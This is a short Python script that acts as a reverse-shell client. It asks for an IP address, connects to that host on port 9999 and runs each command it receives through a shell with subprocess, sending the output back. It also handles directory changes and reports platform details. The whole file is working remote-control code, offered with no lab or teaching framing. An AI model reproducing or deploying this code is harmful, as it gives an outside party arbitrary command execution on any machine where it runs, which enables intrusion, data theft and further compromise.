import socket
import os
import subprocess
import platform


def information_():
    global host
    global port
    global skt
    host = input("Enter IP address: ")
    #host = "192.168.0.101"
    port = 9999
    skt = socket.socket()


def connect_server():
    try:
        global host
        global port
        global skt
        print("\nConnecting to " + str(host) + " .....")
        skt.connect((host, port))
        print("\nConnection established....\n")
        return True
    except socket.error as msg:
        print("Socket connection error: " + str(msg) + "\n.. Check the server connection...\n")


def data_receiving():
    global host
    global port
    global skt
    while True:
        data = skt.recv(1048576)
        if data[:2].decode("utf-8") == "cd":
            os.chdir(data[3:].decode("utf-8"))
        if data[:8].decode("utf-8") == "platform":
            out_str = platform.platform()
            skt.send(str.encode(out_str))
        elif len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                                   stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_string = str(output_byte)

            currentWD = os.getcwd() + " >> "

            skt.send(str.encode(output_string))

            
def main():
    information_()
    connn = False
    connn = connect_server()
    if connn:
        data_receiving()

main()
